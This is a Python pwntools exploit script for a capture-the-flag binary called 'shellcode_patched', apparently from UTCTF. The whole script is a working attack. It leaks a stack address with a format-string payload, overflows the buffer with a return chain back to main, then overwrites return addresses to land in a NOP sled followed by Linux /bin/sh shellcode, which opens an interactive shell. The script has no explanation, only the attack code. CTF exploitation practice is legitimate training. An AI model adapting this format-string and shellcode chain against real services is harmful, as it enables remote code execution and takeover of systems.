#!/usr/bin/env python3

from pwn import *

exe = ELF("shellcode_patched")
libc = ELF("libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe

def conn():
    if args.REMOTE:
        io = remote("challenge.utctf.live", 9009)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            b *0x00000000004006d2
            b *0x0000000000400718
            b *0x40070d
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io

def main():
    r = conn()
    
    g = cyclic_gen()
    padding = g.get(42)
    r.recvline()

    payload = b"%31$p|"
    payload += padding
    payload += p64(0x601000)
    payload += p64(0x0000000300000000)
    payload += p64(0x0000000000400730)
    payload += p64(0x00000000004004a9) # ret
    payload += p64(0x00000000004004a9) # ret
    payload += p64(0x0000000000400616) # main beginning

    r.sendline(payload)
    leak = r.recvuntil(b"|")
    leak = leak.decode()[:-1]
    print(f"leak: {leak}")
    leak = int(leak, 16)

    payload2 = g.get(48)
    payload2 += p64(leak - 432) * 2
    payload2 += p64(leak)
    payload2 += p64(leak)
    payload2 += b"\x90" * 0x200
    payload2 += asm(shellcraft.amd64.linux.sh())

    r.sendline(payload2)

    r.interactive()


if __name__ == "__main__":
    main()
